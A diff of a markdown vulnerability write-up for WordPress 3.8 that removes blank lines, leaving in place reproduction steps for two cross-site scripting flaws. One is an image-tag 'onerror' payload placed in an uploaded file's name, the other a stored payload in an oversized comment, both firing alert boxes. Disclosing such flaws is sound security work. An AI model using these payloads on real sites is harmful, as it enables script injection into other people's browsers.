@@ -11,7 +11,6 @@ WP Version used: **3.8**
 * Go to **Upload Media** menu.
 
 * Upload a file which is more than **20MB** with `"file<img src=x onerror=alert("hacked")>.png"` name.
-
 ![Upload Media](https://i.imgur.com/Ad0wZIt.png)
 
 * DONE
@@ -27,7 +26,6 @@ Stored **XSS** can be executed with malicious comment.
 **Steps:**
 
 * Leave a comment (with a string bigger than 64KB): `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AA... AA'></a>`
-
 ![Leave the comment](https://i.imgur.com/VVD3ZqO.png)
 
 * View the comment on the page
